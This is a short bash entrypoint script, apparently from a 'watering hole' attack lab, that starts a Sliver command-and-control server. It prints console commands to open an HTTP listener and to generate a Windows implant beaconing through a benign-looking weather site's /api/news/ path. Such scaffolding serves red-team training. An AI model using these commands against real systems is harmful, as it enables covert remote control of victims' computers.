#!/bin/bash
set -e

echo "=== Watering Hole - C2 Server (Sliver) ==="
echo "Sliver daemon starting on port ${SLIVER_HTTP_PORT}"
echo ""
echo "To interact with Sliver, connect via console:"
echo "  sliver-server console"
echo ""
echo "Quick start (inside console):"
echo "  http --lport ${SLIVER_HTTP_PORT} --lhost 0.0.0.0"
echo "  generate --http <weather-server-ip>/api/news/ --os windows --arch amd64 --save /home/sliver/builds"
echo "============================================"

exec "$@"
